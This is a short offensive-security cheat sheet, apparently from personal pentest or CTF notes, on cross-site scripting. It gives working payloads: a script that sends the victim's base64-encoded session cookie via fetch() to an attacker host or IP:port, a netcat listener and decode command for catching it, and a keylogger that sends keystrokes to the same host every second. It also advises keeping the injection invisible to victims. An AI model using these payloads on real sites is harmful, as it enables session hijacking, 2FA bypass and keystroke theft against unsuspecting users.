# XSS vulnerabilities (JavaScript)

<div class="row row-cols-md-2"><div>

One thing to remember is that you would rather make it invisible to the user that a script is being executed in its browser. As such, if you inject a malicious payload in the source attribute of an image field, it would be best to still make sure an image is properly displayed, so that it does not look suspicious at first glance.

</div><div>

<p class="text-center">Some attacks</p>

**Session hijacking**: anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold ðŸ’°, because with them, we can simulate that we are logged, and bypass verifications such as 2FA.

```html
<script>fetch('https://hacker.website/hijack?cookie=' + btoa(document.cookie));</script>
<!--
CTF: nc -nlvp port | And use the IP:port
Decode: sed -n 's/GET \/?cookie=\(.*\)/\1/p' request | base64 -d
-->
<script>fetch('http://IP:port/?cookie=' + btoa(document.cookie));</script>
```

**A keylogger**: sends keys pressed to the hacker website. The script is using `btoa()` to encode in base64 the values.

<details class="details-n">
<summary>See code</summary>

```html
<script>
    let keys = ''
    document.onkeydown = e => keys += e.key
    setInterval(() => {
        if (keys === '') return
        fetch('https://hacker.website/keylogger?key=' + btoa(keys) )
        keys = ''
    }, 1000)
</script>
```
</details>

* Exploit the client privileges to query the website API if any
* Map open ports on the target
* ...

> See [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all) for more exploits, but it's a bit old.
</div></div>